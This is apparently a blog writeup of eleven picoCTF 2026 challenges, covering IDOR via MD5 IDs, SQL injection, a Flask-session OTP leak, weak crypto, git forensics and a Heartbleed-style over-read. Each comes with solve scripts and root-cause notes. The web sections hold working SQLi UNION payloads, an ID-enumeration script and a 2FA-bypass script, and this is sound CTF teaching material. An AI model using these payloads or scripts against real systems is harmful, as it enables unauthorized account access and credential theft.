---
title: "picoCTF 2026 — Writeup"
description: "A picoCTF writeup covering 11 challenges across Web, Cryptography, Forensics, and Reverse Engineering: IDOR via MD5, SQLi to hash cracking, a Flask session OTP leak, LFSR-AES, Diffie-Hellman key reuse, an RSA key hidden in JPEG metadata, bitstream and git-history forensics, XOR unpacking, and a Heartbleed-style heap over-read."
date: 2026-08-06T00:53:28+0800
lastmod: 2026-08-06T00:53:28+0800
tag: "CTF, picoCTF, WriteUp"
lang: en-US
---

A late writeup. picoCTF 2026 ran on 2026-03-09, and I only got around to writing
this up months afterward. I kept the notes and solve scripts around, so
here they finally are, cleaned up into one place.

Eleven challenges across four categories, and most of them share a theme: you do
not win by attacking the hard part. The RSA challenge is not solved by factoring,
and the heap challenge is not solved by hijacking control flow. Each one turns on
a design mistake sitting next to the hard primitive, like a hash treated as
authorization, a secret left in git history, or a length the program trusts
without checking. The work is mostly in spotting where the real trust boundary is
and then walking through the gap.

Each section keeps the same four parts: an overview, the insight that cracks it,
the exploitation with the script I actually ran, and the root cause. Flags are
quoted where the source recorded them. Three challenges only produce their flag at
runtime against a live server, so those show the method without a value I never
saved to disk.

## Contents

| Category | Challenge | Class of bug |
|---|---|---|
| Web Exploitation | Hashgate | IDOR behind an MD5 wrapper |
| Web Exploitation | Sql Map1 | Authenticated SQLi into MD5 cracking |
| Web Exploitation | No FA | OTP leaked in a signed Flask session |
| Cryptography | cryptomaze | Reproducible LFSR key schedule for AES |
| Cryptography | Shared Secrets | Diffie-Hellman with a leaked private exponent |
| Cryptography | StegoRSA | RSA private key hidden in JPEG metadata |
| Forensics | Binary Digits | A JPEG serialized as an ASCII bitstream |
| Forensics | Forensics Git 0 | Flag in a git reflog on a disk image |
| Forensics | Forensics Git 2 | "Deleted" secret surviving as a git blob |
| Reverse Engineering | Hidden Cipher 1 | Hardcoded key, reversible XOR |
| Reverse Engineering | Secure Password Database | Heartbleed-style heap over-read |

---

## Web Exploitation

### Hashgate

#### Overview

The portal gives you a guest login and challenges you to reach the
admin's profile. After logging in it redirects to a path shaped like
`/profile/user/e93028bdc1aacdfb3687181f2031765d`, and the guest profile page helpfully
prints `Access level: Guest (ID: 3000)`. The hint mentions a one-way function.

#### Insight

That 32-hex token is not random; it is `md5("3000")`:

```bash
python3 -c 'import hashlib; print(hashlib.md5(b"3000").hexdigest())'
# e93028bdc1aacdfb3687181f2031765d
```

So the backend takes the numeric user ID, wraps it in MD5, and drops it into the
URL as if that were a credential. It is not one. The identifier is fully
predictable, which makes this a textbook IDOR: knowing any user's ID lets you
compute their profile URL directly. A second hint puts the headcount at roughly
20 employees, so the admin sits near ID `3000`.

#### Exploitation

There is no cracking or brute force here. Enumerate the neighbouring IDs and hash
each candidate:

```python
import hashlib
import requests

base = 'http://crystal-peak.picoctf.net:52005'

for i in range(2980, 3051):
    h = hashlib.md5(str(i).encode()).hexdigest()
    r = requests.get(f'{base}/profile/user/{h}', timeout=10)
    t = r.text.strip()
    if 'Cannot GET' not in t and 'Insufficient privileges' not in t:
        print(i, h, r.status_code, t)
```

ID `3018` (`md5 = 9a96a2c73c0d477ff2a6da3bf538f4f4`) returns the admin page:

```text
Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_fa544448}
```

#### Root cause

MD5 is not authorization. Obscuring a predictable ID only changes
how it looks; the server still has to check whether the current session may view
the resource it is asking for. The correct fix is a server-side access-control
check on every profile read, plus unpredictable identifiers (UUIDv4) if a public
handle is genuinely needed. Even then, the authorization check stays.

Flag: `picoCTF{id0r_unl0ck_fa544448}`

### Sql Map1

#### Overview

A register-then-login app. A fresh account logs in and lands on
`vuln.php`, a search page titled `Vulnerable Flag Search` with a `q` GET parameter
that renders results as `key: value` rows. The login form itself shrugs off
injection (`' OR 1=1 -- -` and `admin' -- -` both bounce to `index.php?error=1`),
so the interesting sink is the *authenticated* search, not the front door.

#### Insight

A boolean payload returns every row, confirming the `q` parameter is
injectable:

```sql
' OR 1=1 -- -
```

`ORDER BY` then pins down the column count and, as a bonus, leaks the database
engine through its error message:

```sql
' order by 3 -- -
-- SQLite3::query(): ... 1st ORDER BY term out of range - should be between 1 and 2
```

SQLite, two columns. That combination makes schema extraction trivial, because
SQLite keeps its entire schema in the queryable `sqlite_master` table.

#### Exploitation

Confirm both columns reflect, dump the schema, then dump the
users:

```sql
' union select 'a','b' -- -
' union select name,sql from sqlite_master -- -
' union select username,password from users -- -
```

```text
admin      => 5a9a79d9fa477ed163b89088681672c9
ctf-player => 7a67ab5872843b22b5e14511867c4e43
ghost      => 8d2379c40704bed972e55680be2355e2
...
```

Every hash is 32 hex characters: unsalted MD5, which I confirmed by watching my
own registered password `pass123` appear as its known MD5. Cracking the
`ctf-player` hash via a reverse-lookup gives `dyesebel`. Logging in as
`ctf-player` / `dyesebel` redirects to `secret.php` instead of `vuln.php`, and
that page holds the flag.

#### Root cause

Two failures chained together. A parameterized login form does not
protect you if some *other* authenticated endpoint concatenates user input into a
query, and unsalted MD5 turns any leaked hash back into a working password in
seconds. Defense in depth means both the injection and the storage have to be
fixed; patching only one leaves the chain intact.

Flag: `picoCTF{F0uNd_s3cr3T_K3y_f0R_w3_<>}`

### No FA

#### Overview

This one ships its own Flask source (`app.py`) and a leaked `users.db`.
The admin account has 2FA enabled, so even a correct password only gets you a
redirect to `/two_fa`. The database leak hands you admin's password; the question
is how to get past the second factor.

#### Insight

Reading `app.py`, the OTP handling is where it falls apart. On a successful
password check the server generates the OTP and stores it in the session:

```python
otp = str(random.randint(1000, 9999))
session['otp_secret'] = otp
...
return redirect(url_for('two_fa'))
```

A Flask session cookie is *signed*, which stops you from forging one, but it is
**not encrypted**, so its contents are plain to read. The server has just handed
you a cookie that literally contains the OTP it will check you against. The second
factor defends nothing, because its secret ships to the client in readable form.

#### Exploitation

Log in with the leaked admin password, base64-decode the OTP out
of the session cookie, and replay it to `/two_fa`:

```python
#!/usr/bin/env python3
import base64
import json
import re
import sys
import zlib

import requests

BASE_URL = "http://foggy-cliff.picoctf.net:59494"
USERNAME = "admin"
PASSWORD = "apple@123"


def decode_flask_session(cookie_value: str) -> dict:
    payload = (
        cookie_value.split(".")[1]
        if cookie_value.startswith(".")
        else cookie_value.split(".")[0]
    )
    raw = base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4))
    try:
        raw = zlib.decompress(raw)
    except zlib.error:
        pass
    return json.loads(raw)


def main() -> None:
    base_url = sys.argv[1] if len(sys.argv) > 1 else BASE_URL
    session = requests.Session()

    response = session.post(
        f"{base_url}/login",
        data={"username": USERNAME, "password": PASSWORD},
        allow_redirects=False,
        timeout=15,
    )
    if response.status_code != 302 or response.headers.get("Location") != "/two_fa":
        raise SystemExit("[-] Admin login failed")

    cookie = session.cookies.get("session")
    if not cookie:
        raise SystemExit("[-] Session cookie not found")

    decoded = decode_flask_session(cookie)
    otp = decoded.get("otp_secret")
    if not otp:
        raise SystemExit("[-] OTP not present in session cookie")

    response = session.post(f"{base_url}/two_fa", data={"otp": otp}, timeout=15)

    match = re.search(r"picoCTF\{[^}]+\}", response.text)
    if not match:
        raise SystemExit("[-] Flag not found")

    print(match.group(0))


if __name__ == "__main__":
    main()
```

#### Root cause

A signed cookie guarantees integrity, not confidentiality. Any
value you would not print on the response body does not belong in the session
either. The OTP should live server-side (or be delivered out of band, which the
code's `# send OTP to mail` comment hints was the intent) and never be round-tripped
through the client.

---

## Cryptography

### cryptomaze

#### Overview

The flag is AES-encrypted, and the AES key is derived from a Linear
Feedback Shift Register. The catch is that `output.txt` publishes the LFSR's
initial state *and* its tap positions alongside the ciphertext.

#### Insight

An LFSR is fully deterministic: given the state and taps, its output
is fixed. Publishing both means the key schedule is reproducible by anyone. There
is nothing to break; you regenerate the exact keystream, pack the bits into the 16
AES key bytes, and decrypt.

#### Exploitation

```python
#!/usr/bin/env python3
from ast import literal_eval
from pathlib import Path

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


ROOT = Path(__file__).resolve().parent
CHALLENGE_FILE = ROOT / "Challenges" / "output.txt"


def parse_challenge(path: Path):
    lines = [line.strip() for line in path.read_text().splitlines() if line.strip()]
    state = literal_eval(lines[1])
    taps = literal_eval(lines[3])
    ciphertext = bytes.fromhex(lines[5])
    return state, taps, ciphertext


def lfsr_keystream(state, taps, count):
    register = state[:]
    bits = []
    for _ in range(count):
        output_bit = register[0]
        feedback = 0
        for tap in taps:
            feedback ^= register[tap]
        register = register[1:] + [feedback]
        bits.append(output_bit)
    return bits


def bits_to_bytes(bits):
    out = bytearray()
    for i in range(0, len(bits), 8):
        chunk = bits[i : i + 8]
        value = 0
        for bit in chunk:
            value = (value << 1) | bit
        out.append(value)
    return bytes(out)


def main():
    state, taps, ciphertext = parse_challenge(CHALLENGE_FILE)
    key = bits_to_bytes(lfsr_keystream(state, taps, 16 * 8))
    plaintext = AES.new(key, AES.MODE_ECB).decrypt(ciphertext)
    flag = unpad(plaintext, AES.block_size).decode()
    print(f"key = {key.hex()}")
    print(f"flag = {flag}")


if __name__ == "__main__":
    main()
```

#### Root cause

An LFSR is a pseudorandom *generator*, not a source of secrecy.
Its entire security depends on the state and taps staying hidden, and even then a
plain LFSR is linear enough to recover from a little output. Using one as a
standalone key schedule, then publishing its parameters, leaves no secret at all.

### Shared Secrets

#### Overview

A Diffie-Hellman exchange. The `encryption.py` source shows the shared
secret reduced to a single byte and used as an XOR key over the flag:

```python
shared = pow(A, b, p)
enc = bytes([x ^ (shared % 256) for x in flag])
```

The message file normally gives you `p`, the server's public value `A`, and the
ciphertext `enc`.

#### Insight

The message file also includes `b`, the client's *private* exponent.
Diffie-Hellman's security rests entirely on those exponents staying secret; with
`b` in hand, the shared secret is a one-line computation and no discrete logarithm
is ever required. The 1048-bit modulus is a red herring.

#### Exploitation

```python
#!/usr/bin/env python3
from pathlib import Path
import re


def parse_message(path: Path):
    data = path.read_text()

    def grab(name: str) -> str:
        match = re.search(rf"^{name}\s*=\s*(.+)$", data, re.MULTILINE)
        if not match:
            raise ValueError(f"missing field: {name}")
        return match.group(1).strip()

    return {
        "p": int(grab("p")),
        "A": int(grab("A")),
        "b": int(grab("b")),
        "enc": bytes.fromhex(grab("enc")),
    }


def main():
    challenge_dir = Path(__file__).resolve().parent / "Challenge"
    values = parse_message(challenge_dir / "message.txt")

    shared = pow(values["A"], values["b"], values["p"])
    key = shared % 256
    flag = bytes(c ^ key for c in values["enc"])
    print(flag.decode())


if __name__ == "__main__":
    main()
```

#### Root cause

Leaking one side's private exponent collapses the whole exchange,
and squeezing a 1048-bit secret down to one XOR byte is a second, independent
weakness: even without `b`, that keyspace is only 256 wide and brute-forceable.
Two mistakes, either of which alone loses the flag.

### StegoRSA

#### Overview

An RSA challenge where the public key is conspicuously missing, and the
hints point at metadata and hex. The files are a JPEG and `flag.enc`.

#### Insight

The pivot is not RSA math at all. The JPEG's `Comment` field holds
the full RSA *private* key, hex-encoded as a PEM. Once you have the private key,
there is nothing to factor and no parameters to reconstruct; you just decrypt.
Confirm the metadata and recover the key with off-the-shelf tools:

```bash
exiftool image.jpg                       # Comment is a long hex string
exiftool -b -Comment image.jpg | xxd -r -p > private.pem
openssl pkey -in private.pem -text -noout
```

#### Exploitation

```python
#!/usr/bin/env python3
from binascii import unhexlify
from pathlib import Path

from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from PIL import Image


IMAGE_PATH = Path("Challenge/image.jpg")
ENC_PATH = Path("Challenge/flag.enc")


def extract_private_key(image_path: Path) -> RSA.RsaKey:
    comment = Image.open(image_path).info["comment"]
    pem = unhexlify(comment)
    return RSA.import_key(pem)


def decrypt_flag(key: RSA.RsaKey, enc_path: Path) -> bytes:
    ciphertext = enc_path.read_bytes().strip()
    cipher = PKCS1_v1_5.new(key)
    plaintext = cipher.decrypt(ciphertext, b"")
    if not plaintext:
        raise ValueError("decryption failed")
    return plaintext


def main() -> None:
    key = extract_private_key(IMAGE_PATH)
    flag = decrypt_flag(key, ENC_PATH).decode().strip()
    print(f"[+] Flag: {flag}")


if __name__ == "__main__":
    main()
```

#### Root cause

Before reaching for cryptanalysis, check for information leaks.
File metadata routinely smuggles keys, and a hint that says "hex" almost always
means encoding, not encryption. The math was never the target; the careless key
storage was.

Flag: `picoCTF{rs4_k3y_1n_1mg_66388eb3}`

---

## Forensics

### Binary Digits

#### Overview

The artifact `digits.bin` is one very long ASCII string of nothing but
`1`s and `0`s. `file` reports plain text, so there is no container to parse and the
apparent "meaninglessness" is the point.

#### Insight

The encoding layer *is* the puzzle. The bitstream is a file
serialized bit by bit. Its length is divisible by 8, and grouping into bytes gives
the JPEG magic `ff d8 ff e0`:

```python
bits = open("digits.bin").read().strip()
data = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))
```

Written to disk, those bytes are a normal JPEG with the flag printed inside the
image.

#### Exploitation

Decode the bitstream, then OCR the rendered flag. OCR is noisy,
so the solve script crops, thresholds, and scores several variants before settling
on the best candidate:

```python
def decode_bits_to_jpeg(src: Path, dst: Path) -> None:
    bits = src.read_text(encoding="ascii").strip()
    data = bytes(int(bits[i : i + 8], 2) for i in range(0, len(bits), 8))
    dst.write_bytes(data)


def run_tesseract(image_path: Path) -> str:
    return subprocess.check_output(
        ["tesseract", str(image_path), "stdout", "--psm", "7"],
        text=True,
        stderr=subprocess.DEVNULL,
    ).strip()
```

#### Root cause

ASCII that looks like raw bits is usually just another file encoded
byte by byte. Divisibility by 8 is the quick sanity check, and a file signature is
usually enough to identify the true format underneath.

Flag: `picoCTF{h1dd3n_1n_th3_b1n4ry_67bd9b59}`

### Forensics Git 0

#### Overview

A single `disk.img.gz`. The prompt asks how to extract a directory from
the disk image, which nudges toward filesystem forensics rather than mounting.

#### Insight

The Sleuth Kit reads the filesystem without ever mounting it. `mmls`
shows two Linux partitions; the second, at sector `1140736`, holds the user data.
Walking it recursively surfaces a git repository, and the highest-value target in a
repo is almost never the working tree, it is the history:

```bash
mmls disk.img
fls -r -p -o 1140736 disk.img | rg "\.git/logs/HEAD"
```

#### Exploitation

Read the reflog straight off its inode; the flag is sitting in
the commit message:

```bash
icat -o 1140736 disk.img 65704
# ... commit (initial): Wrap this phrase in the flag format: g17_1n_7h3_d15k_041217d8
```

The solve script automates the whole chain, decompress through extraction:

```python
def linux_offsets(img: Path) -> list[str]:
    out = run(["mmls", str(img)])
    offsets = []
    for line in out.splitlines():
        if "Linux (0x83)" in line:
            parts = line.split()
            if len(parts) >= 3:
                offsets.append(parts[2])
    return offsets


def extract_flag_from_reflog(img: Path, offset: str, inode: str) -> str:
    reflog = run(["icat", "-o", offset, str(img), inode])
    direct = re.search(r"picoCTF\{[^}]+\}", reflog)
    if direct:
        return direct.group(0)
    phrase = re.search(r"Wrap this phrase in the flag format:\s*([A-Za-z0-9_]+)", reflog)
    if phrase:
        return f"picoCTF{{{phrase.group(1)}}}"
    raise RuntimeError("Flag phrase not found in git reflog")
```

#### Root cause

`mmls` + `fls -r -p` + `icat` is a complete read-only pipeline for
a disk image. A `.git` directory inside a forensic image is worth checking first:
reflogs and commit messages leak secrets even when the checked-out tree looks
spotless.

Flag: `picoCTF{g17_1n_7h3_d15k_041217d8}`

### Forensics Git 2

#### Overview

The same disk-image shape, but this time a sensitive chat log was
committed and later "removed," and the prompt notes the deletion routine was
interrupted.

#### Insight

Removing a file from the working tree does not remove it from git. The
blob still lives in `.git/objects`, and the reflog narrates the cover-up:

```text
commit: Add secret hideout chat log
commit: Remove secret hideout log
```

Rather than reconstruct the repository, the robust move is to treat every loose
object as a candidate: `icat` each one out, zlib-inflate it, and grep for the flag.
The guilty blob reads:

```text
Jay: Ask Rusty at the door and use password picoCTF{g17_r35cu3_16ac6bf3}.
```

#### Exploitation

```python
def extract_flag(image: Path, offset: str, inodes: list[str]) -> str | None:
    for inode in inodes:
        try:
            data = run(["icat", "-o", offset, str(image), inode], text=False)
            raw = __import__("zlib").decompress(data)
        except Exception:
            continue
        if b"\x00" not in raw:
            continue
        _, body = raw.split(b"\x00", 1)
        match = FLAG_RE.search(body)
        if match:
            return match.group().decode()
    return None
```

#### Root cause

Git is not a secure-delete tool. A file removed from the working
tree persists as an unreachable-but-intact object, and as long as that object
survives on disk, its contents come back. Interrupting the wipe just guaranteed it.

Flag: `picoCTF{g17_r35cu3_16ac6bf3}`

---

## Reverse Engineering

### Hidden Cipher 1

#### Overview

The binary is UPX-packed and talks to a remote service that prints an
encrypted flag as hex. Unpack before doing anything else, then disassemble:

```bash
upx -d hiddencipher -o hiddencipher.unpacked
objdump -d -Mintel hiddencipher.unpacked
```

#### Insight

`main` reads `flag.txt`, calls `get_secret()`, and XORs each byte
against that secret before printing hex. `get_secret()` builds its key one byte at
a time, and those bytes spell it out in the disassembly:

```text
0x53 0x33 0x43 0x72 0x33 0x74  ->  "S3Cr3t"
```

A repeating-key XOR is its own inverse, so decrypting the service's ciphertext is
just XOR with `S3Cr3t` again.

#### Exploitation

```python
#!/usr/bin/env python3
from itertools import cycle

from pwn import remote


HOST = "candy-mountain.picoctf.net"
PORT = 52358
KEY = b"S3Cr3t"


def main():
    io = remote(HOST, PORT)
    io.recvline()                       # banner
    hex_ct = io.recvline().decode().strip()
    io.close()
    ct = bytes.fromhex(hex_ct)
    flag = bytes(c ^ k for c, k in zip(ct, cycle(KEY))).decode()
    print(f"[+] Flag: {flag}")


if __name__ == "__main__":
    main()
```

#### Root cause

When you see UPX, unpack first; the packing is not protection. The
real weakness is secret management: the key is hardcoded into the function, and a
single-key XOR is symmetric, so encryption and decryption are the same operation.

Flag: `picoCTF{xor_unpack_4nalys1s_cecbcb91}`

### Secure Password Database

#### Overview

Strings alone give it away. The binary references `heartbleed.c`, and
`checksec` reports full mitigations (Full RELRO, canary, NX, PIE). That combination
steers you *away* from control-flow hijacking and *toward* an information leak,
which is exactly what the filename promises.

#### Insight

Disassembling `main` shows the flaw. The program allocates a 90-byte
heap buffer, writes the decoded secret at offset 60, copies your password to the
start, then reads a password *length* and trusts it completely when printing the
buffer back:

```c
char *buf = calloc(0x5a, 1);
store_secret_at(buf + 0x3c);   // secret at offset 60
strcpy(buf, user_input);
int n = atoi(user_len);
for (int i = 0; i <= n && i <= 0x59; i++)
    printf("%d ", (signed char)buf[i]);
```

Send a one-byte password but claim a length of `72`, and the print loop walks past
your input and straight over the secret at offset 60. This is the Heartbleed
pattern exactly: a length the program trusts, leaking adjacent memory.

#### Exploitation

The twelve leaked bytes are `iUbh81!j*hn!`. The binary gates the
flag behind a djb2 hash of that secret, computed over 64-bit arithmetic, so the
only subtlety is matching the overflow width before submitting:

```python
from pwn import *
import re

HOST = args.HOST or "candy-mountain.picoctf.net"
PORT = int(args.PORT or 62771)
LEAK_LEN = 72
SECRET_OFF = 60
SECRET_LEN = 12


def calc_hash(data: bytes) -> int:
    h = 0x1505
    for b in data:
        h = ((h << 5) + h + b) & 0xFFFFFFFFFFFFFFFF
    return h


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"Please set a password for your account:")
    io.sendline(b"A")
    io.recvuntil(b"How many bytes in length is your password?")
    io.sendline(str(LEAK_LEN).encode())
    io.recvuntil(b"Your successfully stored password:\r\n")

    leak = [int(x) for x in io.recvline().decode().strip().split()]
    secret = bytes(x & 0xFF for x in leak[SECRET_OFF : SECRET_OFF + SECRET_LEN])
    secret_hash = calc_hash(secret)

    io.recvuntil(b"Enter your hash to access your account!")
    io.sendline(str(secret_hash).encode())

    out = io.recvall(timeout=3).decode(errors="ignore")
    print(re.search(r"picoCTF\{.*?\}", out).group(0))


if __name__ == "__main__":
    main()
```

#### Root cause

No control flow is corrupted here; a trusted length just spills
neighbouring heap memory, and the secret happens to live one buffer over. Two
things to carry forward: a user-supplied length is never trustworthy, and when you
re-implement a hash, match the original's integer width or the overflow will
diverge and every guess will miss.

Flag: `picoCTF{d0nt_trust_us3rs}`
